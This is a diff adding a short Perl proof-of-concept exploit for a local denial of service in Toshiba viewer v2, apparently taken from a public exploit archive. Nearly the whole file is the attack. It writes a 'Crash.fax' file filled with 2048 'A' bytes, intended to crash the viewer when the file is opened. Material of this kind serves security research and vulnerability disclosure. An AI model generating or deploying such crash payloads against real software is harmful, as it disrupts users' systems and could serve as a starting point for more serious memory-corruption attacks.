@@ -1,0 +1,16 @@
+#!/usr/bin/perl
+
+# Exploit Title: Toshiba viewer v2  p3console Local Denial of Service
+# Date: 02-02-2016
+# Author: JaMbA
+# Download: http://business.toshiba.com/downloads/KB/f1Ulds/9942/viewer2-cj242-v106.zip
+# Version: 2
+# Tested on: Windows 7
+
+my $file= "Crash.fax";
+my $junk= "\x41" x 2048;
+open($FILE,">$file");
+print $FILE $junk;
+print "\nCrash.fax File Created successfully\n";
+print "\ Oumaima & Tarta (Ahmadso best friend)\n";
+close($FILE);
